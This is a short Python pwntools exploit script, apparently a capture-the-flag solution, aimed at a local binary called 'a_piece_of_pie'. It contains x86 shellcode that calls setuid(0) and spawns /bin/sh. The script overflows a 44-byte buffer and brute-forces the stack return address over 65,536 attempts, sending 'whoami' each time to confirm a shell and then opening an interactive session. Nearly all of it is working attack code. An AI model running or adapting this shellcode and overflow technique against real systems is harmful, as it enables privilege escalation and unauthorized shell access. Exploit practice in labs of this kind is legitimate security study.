from pwn import *

shellcode = b"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x17\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x31\xd2\x31\xc0\xb0\x0b\xcd\x80"
nops = b"\x90" * max(0, 44 - len(shellcode))
offset = b"A" * 44

base_addr = 0xff000000
#			0xff8bb420
#			0xffb86b00
max_attempts = 2**16

context.terminal = ["kitty"]
context.log_level = 'error'

for i in range(max_attempts):

	address = p32(base_addr + i)
	
	p = process("./a_piece_of_pie")
	p.send(shellcode + nops + address)
	response = p.recv(timeout=2)
	#print(f"[DEBUG] Response received: {response}")
	#gdb.attach(p, "break *vuln+123")
	#p.interactive()
	try:
		p.sendline(b"whoami")
		p.sendline(b"whoami")
		response = p.recv(timeout=1)
		print(f"[DEBUG] Response received: {response}")

		if response and b"alexis" in response or b"user" in response:
			p.interactive()
			break
		else:
			print("no crash detected.")
			p.interactive()
	except EOFError:
		pass
	except Exception as e:
		print(f"Unexpected error: {e}")
	
	p.close()
